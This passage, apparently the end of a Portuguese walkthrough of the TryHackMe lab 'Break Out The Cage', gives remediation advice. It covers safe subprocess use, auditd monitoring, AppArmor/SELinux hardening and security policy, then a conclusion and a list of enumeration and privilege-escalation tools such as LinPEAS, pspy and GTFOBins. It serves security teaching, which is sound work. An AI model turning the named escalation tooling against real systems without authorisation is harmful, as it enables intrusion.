chmod 755 /opt/.dads_scripts/spread_the_quotes.py
```

## 3. Segurança de Scripts

```python
# Substituir os.system() por subprocess com sanitização
import subprocess
import shlex

# Seguro: usar lista de argumentos
subprocess.run(["wall", quote])

# Ou sanitizar entrada
safe_quote = shlex.quote(quote)
subprocess.run(f"wall {safe_quote}", shell=True)
```

## 4. Monitoramento e Logging

```bash
# Configurar auditd para monitorar arquivos sensíveis
apt install auditd
auditctl -w /opt/.dads_scripts/.files/.quotes -p wa -k quotes_file
auditctl -w /opt/.dads_scripts/spread_the_quotes.py -p wa -k quotes_script

# Monitorar tentativas de escalação de privilégios
echo "auth.* /var/log/auth.log" >> /etc/rsyslog.conf
```

## 5. Hardening do Sistema

```bash
# Configurar AppArmor para serviços
apt install apparmor-profiles
aa-enforce /usr/sbin/sshd
aa-enforce /usr/sbin/vsftpd

# Implementar SELinux (para RedHat-based)
yum install selinux-policy-targeted
setenforce 1

# Atualizações regulares de segurança
apt update && apt upgrade -y
unattended-upgrades --enable
```

## 6. Educação e Políticas

- **Treinamento**: Conscientização sobre segurança para todos os usuários
- **Políticas de Senha**: Senhas fortes e únicas para cada serviço
- **Revisão de Código**: Análise de segurança antes de deploy
- **Testes de Penetração**: Avaliações regulares de segurança

---
# Conclusão

O laboratório "Break Out The Cage" da TryHackMe demonstrou de forma prática e educativa múltiplas vulnerabilidades comuns em sistemas Linux. Através de um cenário envolvente baseado no tema Nicholas Cage, foram abordados:

## Principais Aprendizados

1. **Cadeias de Exploração**: Como vulnerabilidades aparentemente menores podem ser combinadas para comprometer sistemas completamente
2. **Importância da Enumeração**: A descoberta meticulosa de informações é fundamental para o sucesso
3. **Criptografia vs Codificação**: Diferença crucial entre mecanismos de segurança reais e falsas sensações de segurança

---
# Referências

## Ferramentas Utilizadas

### Análise de Rede e Enumeração

- **Nmap** - Scanner de rede: [https://nmap.org/](https://nmap.org/)
- **Gobuster** - Directory brute-forcing: [https://github.com/OJ/gobuster](https://github.com/OJ/gobuster)
- **Netcat** - Ferramenta de rede versátil: [https://nc110.sourceforge.io/](https://nc110.sourceforge.io/)

### Análise Forense e Esteganografia

- **Sonic Visualiser** - Análise de espectrograma: [https://www.sonicvisualiser.org/](https://www.sonicvisualiser.org/)
- **Audacity** - Alternativa para análise de áudio: [https://www.audacityteam.org/](https://www.audacityteam.org/)

### Criptoanálise

- **Cryptii** - Ferramentas criptográficas online: [https://cryptii.com/](https://cryptii.com/)
- **Boxentriq Cipher Identifier**: [https://www.boxentriq.com/code-breaking/cipher-identifier](https://www.boxentriq.com/code-breaking/cipher-identifier)
- **CyberChef** - Swiss Army knife de criptografia: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

### Escalação de Privilégios

- **LinPEAS** - Linux Privilege Escalation Awesome Script: [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng)
- **pspy** - Monitoramento de processos: [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)
- **GTFOBins** - Binários SUID/escapamento: [https://gtfobins.github.io/](https://gtfobins.github.io/)

